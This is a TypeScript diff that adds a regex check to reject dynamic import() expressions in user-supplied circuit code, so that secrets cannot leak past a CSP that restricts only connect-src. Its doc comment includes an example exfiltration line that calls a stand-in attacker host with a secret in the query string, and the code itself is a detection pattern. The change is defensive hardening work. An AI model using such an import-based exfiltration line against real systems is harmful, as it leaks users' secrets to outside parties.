@@ -33,6 +33,32 @@ export function hasImportStatements(jsCode: string): boolean {
   return /^\s*import\s/m.test(jsCode);
 }
 
+/**
+ * Returns true if the JS source contains a dynamic `import()` expression.
+ *
+ * Why we forbid these: dynamic `import()` is governed by CSP `script-src`, not
+ * `connect-src`. With our current CSP only restricting `connect-src`, a user
+ * circuit containing `await import('https://attacker.example/?leak=' + secret)`
+ * would fire the request unchecked — the URL itself is an exfiltration channel
+ * (the attacker logs the query string; the response need not even be a valid
+ * module). The rewriter only rewrites *static* `import` statements; leaving
+ * `import()` to pass through is the bug.
+ *
+ * Circuit code is data-flow definition — there is no legitimate need to lazily
+ * load modules at runtime. Static imports cover the entire real use case
+ * (importing a hash lib as a Tier-A oracle, importing fast-check, etc).
+ * Rejecting at compile time is the right tradeoff. Revisit if a real workflow
+ * surfaces.
+ *
+ * Detection is a regex over the raw source — it matches `import(` inside
+ * string literals or comments too. Both are exceedingly rare in circuit code
+ * (no template strings building source code); the false-positive cost is a
+ * clear compile error, not a silent miscompile.
+ */
+export function containsDynamicImport(jsCode: string): boolean {
+  return /\bimport\s*\(/.test(jsCode);
+}
+
 // ── Specifier helpers ──────────────────────────────────────────────────────
 
 function isSimtenSpecifier(specifier: string): boolean {
